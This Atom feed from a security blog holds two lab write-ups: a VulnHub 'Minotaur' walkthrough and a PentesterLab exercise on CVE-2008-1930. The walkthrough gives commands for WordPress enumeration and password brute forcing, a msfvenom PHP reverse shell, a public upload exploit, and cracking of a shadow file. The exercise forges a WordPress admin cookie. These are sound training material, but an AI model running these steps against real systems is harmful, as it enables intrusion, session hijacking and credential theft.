<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: wordpress | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/wordpress/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-07-20T16:24:59-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[SecTalks: BNE0x00 - Minotaur]]></title>
    <link href="http://wg135.github.io/blog/2016/04/26/sectalks-bne0x00-minotaur/"/>
    <updated>2016-04-26T13:27:14-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/26/sectalks-bne0x00-minotaur</id>
    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,139/">Vulhub</a></p>

<h3>Forces:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>WPscan</li>
<li>msfvenom</li>
<li>John the Ripper</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>

<p><img src="/images/blog/vulhub/bne03/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.56.223 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.56.223 -p-</code></p>

<p><img src="/images/blog/vulhub/bne03/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>port 22, 80 and 2020 are opening.</p>

<p>use wfuzz to find more locations</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.223/FUZZ 2&gt;/dev/null</code></p>

<p><img src="/images/blog/vulhub/bne03/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>found <a href="http://192.168.56.223/bull/">http://192.168.56.223/bull/</a></p>

<p>Check the page, looks like it uses wordpress. Good. maybe I can find out some outdated wordpress plugins.</p>

<p><img src="/images/blog/vulhub/bne03/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>I use wpscan to find wordpress plugins vulnerabilities.</p>

<p><code>uby wpscan.rb --url http://192.168.56.223/bull/</code></p>

<p>get some xss vulnerabilities and an interestig arbutrart file upload vulnerability.</p>

<p><img src="/images/blog/vulhub/bne03/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>next step, user enumeration.</p>

<p><code>ruby wpscan.rb --url http://192.168.56.223/bull/ --enumerate u</code></p>

<p><img src="/images/blog/vulhub/bne03/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>get a user name <code>bully</code></p>

<p>next step, password guessing:</p>

<p><code>ruby wpscan.rb --url http://192.168.56.223/bull/ --wordlist SecLists/Passwords/passwords_john.txt threads 50</code></p>

<p>no luck this time. Let&rsquo;s try harder..</p>

<p>we use cewl this time to generate password file</p>

<p><code>cewl -w password.txt http://192.168.56.223/bull/</code></p>

<p>also john the ripper should be used to mutate the password file:</p>

<p><code>john --wordlist=password.txt --rules --stdout &gt; out.txt</code></p>

<p>now I use wpscan to brute force the password:</p>

<p><code>wpscan --url 192.168.56.223/bull --wordlist out.txt --username bully</code></p>

<p><img src="/images/blog/vulhub/bne03/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Now, create php reverse shell:</p>

<p><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.223 -a php --platform php -o evil.php</code></p>

<p>based one wpscan scan result, the wordpress slideshow gallery shell upload exploit(<a href="https://www.exploit-db.com/exploits/34681/">https://www.exploit-db.com/exploits/34681/</a>) is found. Save it as <code>wp_gallery.py</code></p>

<p>run:</p>

<p><code>python wp_gallery.py -t http://192.168.56.223/bull -u bully -p Bighornedbulls -f evil.php</code></p>

<p><img src="/images/blog/vulhub/bne03/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>set netcat
<code>nc -nlvp 1234</code></p>

<p>visit <code>http://192.168.56.223/bull/wp-content/uploads/slideshow-gallery/evil.php</code></p>

<p>get the meterpreter</p>

<p><img src="/images/blog/vulhub/bne03/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>locate flag.txt and get the result <code>/tmp/flag.txt</code></p>

<p>find a file shadow.bak in /tmp, I got some interesting things:</p>

<p><img src="/images/blog/vulhub/bne03/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like there are more chances to me. Download this file and use john to crack more.</p>

<p><code>john --fork=4 shadow.bak</code></p>

<p>now I have two more accounts info</p>

<p><img src="/images/blog/vulhub/bne03/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>use python <code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p>Login as heffer:</p>

<p><img src="/images/blog/vulhub/bne03/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>Login as minotaur:</p>

<p><img src="/images/blog/vulhub/bne03/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CVE-2008-1930 Wordpress 2.5 Cookie Integrity Protection Vulnerability]]></title>
    <link href="http://wg135.github.io/blog/2016/04/18/cve-2008-1930/"/>
    <updated>2016-04-18T16:53:35-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/18/cve-2008-1930</id>
    <content type="html"><![CDATA[<p><em>Wake up..Neo.. The Matrix HAS YOU</em> &mdash;&ndash;the Matrix</p>

<p>From <a href="https://pentesterlab.com/exercises/cve-2008-1930/course">pentesterlab</a>
This course details the exploitation of an issue in the cookies integrity mechanism of Wordpress. This issue was found in 2008 and allowed an attacker to gain administrator access to a wordpress instance if user registration is enabled.</p>

<p>Difficluty: 2/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Cookie Manager+</li>
<li>wfuzz</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Use wfuzz to burte force hidden path of the server</p>

<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2&gt;/dev/null
</code></pre>

<p><img src="/images/blog/pentesterlab/cve_2008_1930/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>next step, we use admin1 and password pentesterlab to login as user admin1</p>

<p><img src="/images/blog/pentesterlab/cve_2008_1930/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/pentesterlab/cve_2008_1930/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>here we can use Cookie Manager+ to view the cookies we got.</p>

<p><img src="/images/blog/pentesterlab/cve_2008_1930/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>modify cookie from <code>admin1%7C1461188835%7Ce6cf864114aa5acaae0795ff56b333b0</code> to <code>admin%7C11461188835%7Ce6cf864114aa5acaae0795ff56b333b0</code>, reload the page, now we are in admin&rsquo;s session.</p>

<p><img src="/images/blog/pentesterlab/cve_2008_1930/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
</feed>
